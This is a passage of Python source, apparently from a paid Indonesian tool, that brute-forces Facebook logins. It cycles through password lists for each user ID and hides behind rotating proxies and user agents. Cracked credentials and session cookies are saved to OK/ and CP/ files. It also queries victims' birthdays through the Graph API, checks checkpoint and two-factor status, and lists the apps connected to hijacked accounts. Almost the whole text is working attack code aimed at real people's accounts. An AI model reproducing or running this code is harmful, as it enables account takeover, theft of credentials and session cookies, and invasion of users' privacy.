(KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17","Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"])
	proxy = {'http': 'socks5://'+random.choice(xx)}
	print(f"\r {P}[{bb}+{P}]{P} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			link = ses.get(f"https://{url}/login/?source=auth_switcher")
			data2 = {
					"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
					"email":idf,
					"pass":pw,
					"next":"https://"+url+"/login/save-device/?login_source=login",
					"login":"Accedi",
					"persistent":"1",
					"default_persistent": "0",
					'prefill_contact_point': idf,
                    'prefill_source': 'browser_dropdown',
                    'prefill_type': 'password',
                    'first_prefill_source': 'browser_dropdown',
                    'first_prefill_type':'contact_point',
                    'had_cp_prefilled':'true',
                    'had_password_prefilled': 'true',
                    'is_smart_lock': 'true',
                    'bi_xrwh':'0'
				}
			headers = {
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'da,en-gb;q=0.8,en;q=0.7',
					'connection': 'closed',
					'content-type': 'application/x-www-form-urlencoded',
					'Host': url,
					'origin': 'https://'+url,
					'referer': 'https://'+url+'/login/?source=auth_switcher',
					'upgrade-insecure-requests': '1',
					'user-agent': ua,
					'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
					'sec-ch-ua-mobile': '?0',
					'sec-ch-ua-platform': '"Chromium OS"',
					'sec-fetch-dest': 'empty',
					'sec-fetch-mode': 'cors',
					'sec-fetch-site': 'same-origin',
					'x-cache-lookup': 'HIT from cp1006.eqiad.wmnet:3128,MISS from cp1010.eqiad.wmnet:80',
					'x-frame-options': 'SAMEORIGIN',
					'x-requested-with': 'XMLHttpRequest',
					'x-xss-protection': '0',
				}
			bx = ses.post(f'https://{url}/login/?login/device-based/login/async/?refsrc=deprecated&lwv=100', headers=headers, data=data2)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							mkz = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=mkz).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r {P}[{kk}+{P}]{P} ID FB  : {kk}{idf}{P}          \n {P}[{kk}+{P}]{P} sandi  : {kk}{pw}          {P}\n {P}[{kk}+{P}]{P} lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+only_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\r {P}[{kk}+{P}]{P} ID FB  : {kk}{idf}{P}          \n {P}[{kk}+{P}]{P} sandi  : {kk}{pw}          {P}\n {P}[{kk}+{P}]{P} User agent : {bb}{ua}\n')
							open('CP/'+only_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+only_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r {P}[{hh}+{P}]{P} ID FB  : {hh}{idf}{P}          \n {P}[{hh}+{P}]{P} sandi  : {hh}{pw}          {P}\n {P}[{hh}+{P}]{P} cookie : {hh}{kuki}{P}\n {P}[{hh}+{P}]{P} User agent : {bb}{ua}\n')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		#except Exception as e:print(e)
	loop+=1
	
def crack_new(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(redmi_5a)
	ua2 = random.choice(["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9","Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17","Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"])
	proxy = {'http': 'socks5://'+random.choice(xx)}
	print(f"\r {P}[{bb}+{P}]{P} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			link = ses.get(f"https://{url}/login/?source=auth_switcher")
			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"email":idf,"pass":pw}
			head = {
			'Host': url,
			'content-length': str(random.randint(100, 200)),
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document', 
			'referer': 'https://'+url+'/login/?ref=dbl&fl',
			}
			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', headers=head, data=date)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							mkz = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=mkz).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r {P}[{kk}+{P}]{P} ID FB  : {kk}{idf}{P}          \n {P}[{kk}+{P}]{P} sandi  : {kk}{pw}          {P}\n {P}[{kk}+{P}]{P} lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+only_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\r {P}[{kk}+{P}]{P} ID FB  : {kk}{idf}{P}          \n {P}[{kk}+{P}]{P} sandi  : {kk}{pw}          {P}\n {P}[{kk}+{P}]{P} User agent : {bb}{ua}\n')
							open('CP/'+only_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+only_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r {P}[{hh}+{P}]{P} ID FB  : {hh}{idf}{P}          \n {P}[{hh}+{P}]{P} sandi  : {hh}{pw}          {P}\n {P}[{hh}+{P}]{P} cookie : {hh}{kuki}{P}\n')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		#except Exception as e:print(e)
	loop+=1
	

###---[ CEK OPSI AKUN CP ]---###
opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi		

def cek_opsi(idf,pw,ua):
	akun = ''
	try:
		token = open('.token.txt','r').read()
		bas = {"cookie":open('.cookie.txt','r').read()}
		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		m, d, y = ttl.split('/')
		m = tete[m]
		akun += f' {kk}>{P} ID FB  : {kk}{idf}{P}          \n {kk}>{P} sandi  : {kk}{pw}          {P}\n {kk}>{P} lahir  : {kk}{d} {m} {y}{P}           '
		mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('CP/'+only_cp,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' {kk}>{P} ID FB  : {kk}{idf}{P}          \n {kk}>{P} sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('CP/'+only_cp,'a').write(idf+'|'+pw+'\n')
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n [{hh}>{P}] hore akun tap yes                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f'\n {kk}>{P} akun terpasang A2F                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f'\n {hh}>{P} akun tidak checkpoint                       \n {hh}>{P} cookie : {cok}'
			else:
				akun += f'\n {kk}>{P} ada {len(opsi)} opsi :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n {kk}{o}{P} {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f'\n {M}>{P} kata sandi salah / spam                      '
	print('\r'+ akun)
	print('\r                                                                       ')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
	
def convertv2(cookie):
	cok = ('zsh=%s;sb=%s;datr=%s;dbln=%s;fr=%s'%(cookie['zsh'],cookie['sb'],cookie['datr'],cookie['dbln'],cookie['fr']))
	return(str(cok))


###---[ CEK APLIKASI ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' {hh}>{P} ID FB  : {hh}{idf}{P}          \n {hh}>{P} sandi  : {hh}{pw}          {P}\n {hh}>{P} cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:pass
	else:
		akun = (f' {bb}>{P} aplikasi ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {bb}> {hh}{no} {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {bb}>{P} aplikasi kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {bb}> {kk}{no} {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {M}>>{P} aplikasi yang dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {M}> {no} {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,cookie)
	except:pass

#--[ cek apk kadaluarsa ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ cek apk dihapus ]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print('\r\x1b[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Memeriksa Lisensi ' + o,)
        sys.stdout.flush()
        time.sleep(1)
        
def lisen():
    os.system('clear')
    logo2()
    print('\x1b[1;97m [*] Mohon tunggu ...');time.sleep(1.0)
    id = uuid.uuid4().hex[:25]
    idg = open('licensed.log', 'w')
    idg.write(id)
    idg.close()
    print('\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi : \x1b[96m' + id)
    time.sleep(0.07)
    print('\x1b[1;91m [*] Lisensi Belum Di konfirmasi\x1b[1;39m')
    su=input("%s•%s ingin beli lisensi? y/t %s: %s"%(U,O,M,K))
    if su in['']:
        exit()
    os.system('am start https://wa.me/+6281336752461?text=Hi+Sayang+Beli+Lisensi+dong.%20Lisensi:%20' + id + ' >/dev/null') 
    time.sleep(1)
    os.sys.exit()
def user1():
    try:
        j = open('licensed.log', 'r').read()
        r = requests.get('https://github.com/cyber8-dev/License/blob/main/id').text.strip() # Jangan Di ganti bro'i nanti error
        if j in r:
            os.system('clear')
            logo2()
            tik()
            print('\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi \033[1;92mTersedia ✓')
            time.sleep(1)
        else:
            os.system('clear')
            logo2()
            tik()
            print('\x1b[1;91m [*] Lisensi Tidak Tersedia !')
            time.sleep(1)
            lisen()
            print('\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Chat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
            time.sleep(0.07)
            input('\x1b[1;97m [*] Tekan Enter ')
            os.system('am start https://wa.me/+6285731973552?text=Hi+Sayang+Beli+Lisensi+dong.%20Lisensi:%20' + j + ' >/dev/null')
            os.sys.exit()
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print('\x1b[1;91m [!] Tidak Ada Koneksi Data\x1b[0;97m')
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'licensed.log'])
        romz()
def masuk():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass
	xxnx()
	clear_layar()
	kembali()



if __name__=='__main__':
	masuk()
